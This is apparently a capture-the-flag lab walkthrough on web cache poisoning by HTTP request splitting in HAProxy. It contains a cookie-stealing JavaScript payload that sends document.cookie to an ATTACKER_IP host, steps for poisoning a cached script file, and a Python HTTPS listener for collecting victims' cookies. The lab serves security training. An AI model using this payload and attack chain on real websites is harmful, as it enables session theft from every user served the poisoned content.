## Web Cache Poisoning

Even if we can't influence other users' connections directly, we may be able to use request tunneling to poison server-side caching mechanisms, affecting users indirectly. This kind of attack has a high severity as it impacts all users visiting the website for as long as the cached content lasts. Given the right conditions, the poisoned cached content can have anything the attacker wants, including JavaScript payloads. This can be used to issue malicious redirects or even steal user sessions.

> **Note:** Extreme care needs to be taken when testing web cache poisoning in real-world production systems, as they may affect the availability of the website if not conducted properly.

### Understanding the Scenario

For this task, we are still using **HAProxy**. The HAProxy instance is configured to cache content for **30 seconds**, so we should be able to perform the attack. If something gets cached wrongly during testing, waiting for 30 seconds will clear the cache so you can start from scratch.

To achieve cache poisoning, we want to make a request to the proxy for `/page1` and somehow force the backend web server to respond with the contents of `/page2`. If this were to happen, the proxy would wrongly associate the URL of `/page1` with the cached content of `/page2`.

The trick we are using allows poisoning the cache only with the content of other pages on the same website. However, there are ways to overcome this limitation:

- If the website has an **upload functionality**.
- If we find a **part of the website that reflects content from a request parameter** (e.g., blog articles).
- Under certain circumstances, **open redirects** can also be abused (not covered in this case).

In our application, we have an upload functionality at `/upload`, allowing us to upload any payload we want cached later.

### File Uploads

#### **Executing the Plan**

Our goal in this task is to **steal cookies** from any user visiting `https://MACHINE_IP:8100/`. The lab already simulates a victim user, and the flag for this task is in that user's cookies.

A direct cache poisoning attack on `/` is possible but too obvious. Instead, inspecting `/` reveals that it calls the `showText()` JavaScript function from `/static/text.js`. 

#### **Poisoning /static/text.js**

We will inject a JavaScript payload to steal cookies. First, we upload the following script as `myjs.js`:

```javascript
var xhttp = new XMLHttpRequest();
xhttp.onreadystatechange = function() {
    if (this.readyState == 4 && this.status == 200) {
       document.getElementById("demo").innerHTML = xhttp.responseText;
    }
};
xhttp.open("GET", "https://ATTACKER_IP:8002/?c="+document.cookie, true);
xhttp.send();
```

> **Replace `ATTACKER_IP` with your actual AttackBox IP.**

After uploading, the file is stored at `/static/uploads/myjs.js`. Now, we need to poison the cache so that requests for `/static/text.js` return our payload.

#### **HTTP Request Splitting to Poison the Cache**

Using a CRLF injection vulnerability in HAProxy, we perform **request splitting** in the backend. The first backend request fetches `/static/text.js`, while the second fetches `/static/uploads/myjs.js`. The proxy expects a single response but gets two. The first is served to the user, and the second is queued.

To force the proxy to bypass existing cache and send the request to the backend, we use:

```http
Pragma: no-cache
```

After sending another request for `/static/text.js`, the queued response (`myjs.js`) is incorrectly associated with `/static/text.js`, poisoning the cache for **30 seconds**.

#### **Verifying the Attack**

To check if the attack worked, use:

```sh
curl -kv https://MACHINE_IP:8100/static/text.js
```

> **Don't use a browser!** Browsers cache content locally, which might alter the response.

### Receiving the Flag

Once poisoned, when the victim visits `/`, their cookies will be sent to our **AttackBox on port 8002 via HTTPS**. We need an HTTPS web server to capture the cookies.

#### **Generating an SSL Certificate**

Run the following command to create an SSL certificate:

```sh
openssl req -x509 -newkey rsa:4096 -keyout key.pem -out cert.pem -sha256 -days 3650 -nodes \
-subj "/C=XX/ST=StateName/L=CityName/O=CompanyName/OU=CompanySectionName/CN=CommonNameOrHostname"
```

#### **Setting Up the HTTPS Web Server**

Create `https.py`:

```python
from http.server import HTTPServer, BaseHTTPRequestHandler 
import ssl

httpd = HTTPServer(('0.0.0.0', 8002), BaseHTTPRequestHandler)
httpd.socket = ssl.wrap_socket(
    httpd.socket,
    keyfile="key.pem",
    certfile='cert.pem',
    server_side=True)
httpd.serve_forever()
```

Run the server:

```sh
python3 https.py
```

The victim visits `/` every **20 seconds**, so the flag should appear soon. If not, re-poison the cache.

### Summary

1. **Upload** malicious JavaScript (`myjs.js`).
2. **Exploit HTTP request splitting** to associate `/static/text.js` with `myjs.js`.
3. **Check poisoning success** using `curl`.
4. **Set up an HTTPS server** to capture the victim's cookies.
5. **Receive the flag** when the victim visits `/`.

This attack highlights the dangers of **cache poisoning vulnerabilities** in HAProxy and similar proxy servers.